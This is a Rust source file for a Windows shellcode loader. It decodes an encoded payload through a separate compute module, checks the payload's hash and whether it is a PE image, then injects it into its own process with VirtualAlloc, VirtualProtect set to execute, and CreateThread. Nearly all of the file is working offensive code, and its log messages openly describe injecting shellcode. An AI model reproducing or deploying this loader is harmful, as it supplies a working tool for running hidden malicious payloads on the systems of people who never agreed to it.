pub mod compute;

use windows::Win32::Foundation::GetLastError;
use windows::Win32::System::Memory::{
    VirtualAlloc,
    VirtualProtect,
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE, PAGE_PROTECTION_FLAGS
};
use windows::Win32::System::Threading::{CreateThread, GetCurrentProcessId, THREAD_CREATION_FLAGS};
use windows::core::Result;

use crate::compute::{run_compute, fnv1a32, PayloadMeta, BYTECODE, META_FILE};



// unsafe fn free(payload: *mut u8) {
//     HeapFree(GetProcessHeap(), 0, payload as *mut c_void);
// }

fn main() -> Result<()> {
    let meta = PayloadMeta::load();
    let payload = run_compute(&meta, BYTECODE)?;

    println!(
        "payload    : {} bytes ({} words, {} groups x {})",
        meta.plain_len,
        meta.word_count,
        meta.dispatch_groups(),
        meta.group_size
    );
    if payload.len() >= 4 {
        let magic = u32::from_le_bytes(payload[..4].try_into().unwrap());
        println!(
            "first dword: 0x{magic:08X}{}",
            if magic == 0x0090_5A4D {
                " (PE image)"
            } else {
                ""
            }
        );
    }
    let preview = &payload[..payload.len().min(64)];
    println!("first {} bytes: {:02X?}", preview.len(), preview);

    match meta.fnv1a32 {
        Some(expected) => {
            let actual = fnv1a32(&payload);
            println!(
                "fnv1a32    : 0x{actual:08X} {} (reference 0x{expected:08X})",
                if actual == expected {
                    "MATCH"
                } else {
                    "MISMATCH - the bytecode and the metadata are from different runs?"
                }
            );
        }
        None => println!("fnv1a32    : no reference hash in {META_FILE}"),
    }

    unsafe {
        println!(
            "[i] Injecting Shellcode. The local process of PID: {}",
            GetCurrentProcessId()
        );

        let shellcode_address = VirtualAlloc(
            None,
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if shellcode_address.is_null() {
            println!("[!] VirtualAlloc Failed with error: {:?}", GetLastError());
            //free(payload);
            return Err(GetLastError().into());
        }
        println!("[i] Allocated Memory At: {:p}", shellcode_address);

        std::ptr::copy_nonoverlapping(
            payload.as_ptr(),
            shellcode_address as *mut u8,
            payload.len(),
        );

        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        if let Err(err) = VirtualProtect(
            shellcode_address,
            payload.len(),
            PAGE_EXECUTE,
            &mut old_protect,
        ) {
            println!("[!] VirtualProtect failed with error: {err:?}");
            return Err(err);
        }

        println!("[i] Payload written Successfully...");

        println!("[#] Press <Enter> to run ...");
        let mut buffer = String::new();
        std::io::stdin().read_line(&mut buffer).unwrap();

        if let Err(err) = CreateThread(
            None,
            0,
            Some(std::mem::transmute::<
                *mut std::ffi::c_void,
                unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
            >(shellcode_address)),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        ) {
            println!("[!] CreateThread failed with error: {err:?}");
            return Err(GetLastError().into());
        }

        println!("[#] Press <Enter> To Quit ...");
        let mut buffer = String::new();
        std::io::stdin().read_line(&mut buffer).unwrap();
    }
    Ok(())
}
